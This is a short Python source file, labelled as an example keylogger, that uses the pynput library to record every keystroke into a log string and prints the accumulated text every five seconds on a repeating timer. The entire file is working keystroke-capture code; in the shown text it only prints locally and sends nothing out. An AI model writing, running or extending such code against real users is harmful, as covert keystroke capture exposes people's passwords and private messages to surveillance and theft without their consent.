#!/usr/bin/env python
# This script is an example of a keylogger

import pynput.keyboard # This library allows to monitor mouse clicks and keyboard strokes.
import threading

class Keylogger:

    def __init__(self):
        self.log = ""

    def append_to_key(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_key(current_key)

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        try:
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
        except KeyboardInterrupt:
            print("\nExiting program")